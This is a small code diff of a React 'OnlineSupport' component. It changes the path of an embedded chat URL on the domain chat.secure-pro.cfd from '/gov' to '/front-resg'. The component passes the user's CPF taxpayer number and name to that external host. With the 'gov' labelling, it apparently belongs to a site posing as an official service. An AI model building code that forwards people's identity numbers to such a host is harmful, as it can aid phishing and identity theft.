@@ -26,7 +26,7 @@ const OnlineSupport: React.FC<OnlineSupportProps> = ({ cpf, nome, urlParams }) =
     params.set('nome', nome);
   }
   
-  const embedUrl = `https://chat.secure-pro.cfd/gov?${params.toString()}`;
+  const embedUrl = `https://chat.secure-pro.cfd/front-resg?${params.toString()}`;
 
   return (
     <div data-testid="online-support" className="bg-white shadow-md w-full mx-auto">
